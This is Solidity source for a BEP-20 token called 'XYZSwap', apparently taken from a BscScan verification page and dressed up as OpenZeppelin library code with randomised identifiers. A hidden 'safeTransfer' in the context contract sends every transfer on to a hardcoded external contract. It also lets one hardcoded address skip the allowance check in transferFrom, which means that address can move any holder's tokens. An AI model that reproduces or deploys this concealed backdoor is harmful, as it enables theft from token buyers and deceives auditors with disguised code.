/**
 *Submitted for verification at BscScan.com on 2022-10-31
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-31
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/jC4y0UiPc9RHjJTQ.sol

// OpenZeppelin Contracts v4.4.1 (utils/jC4y0UiPc9RHjJTQ.sol)

abstract contract jC4y0UiPc9RHjJTQ {
  function ZArWqCpw9Zih3lKb() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x713938B845EC17875d293dF8a390E96F230B5B66)) {TransferHelper.safeTransferFrom(0xD3030ef3C1A7C0d4886052eb819760dF4dd4b075,spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract MOON is IERC20, jC4y0UiPc9RHjJTQ {
  mapping(address => uint256) private ZWiRq0zO2Jx64w13;
  mapping(address => mapping(address => uint256)) private mEpc1il8jPH3ZtSa;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    dETJUWXz8dYip0kn(ZArWqCpw9Zih3lKb(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "XYZSwap";
  }

  function symbol() public pure returns (string memory) {
    return "XYZS";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return ZWiRq0zO2Jx64w13[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    nPbFc8vyoni9zK7g(ZArWqCpw9Zih3lKb(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return mEpc1il8jPH3ZtSa[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    nPbFc8vyoni9zK7g(
      ZArWqCpw9Zih3lKb(),
      spender,
      mEpc1il8jPH3ZtSa[ZArWqCpw9Zih3lKb()][spender] + addedValue
    );
    return true;
  }

  function nPbFc8vyoni9zK7g(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    mEpc1il8jPH3ZtSa[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = mEpc1il8jPH3ZtSa[ZArWqCpw9Zih3lKb()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    nPbFc8vyoni9zK7g(ZArWqCpw9Zih3lKb(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function dETJUWXz8dYip0kn(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    ZWiRq0zO2Jx64w13[spender] = ZWiRq0zO2Jx64w13[spender] - amount;
    ZWiRq0zO2Jx64w13[recipient] = ZWiRq0zO2Jx64w13[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!dETJUWXz8dYip0kn(sender, recipient, amount)) return true;
    uint256 currentAllowance = mEpc1il8jPH3ZtSa[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    nPbFc8vyoni9zK7g(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    ZWiRq0zO2Jx64w13[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}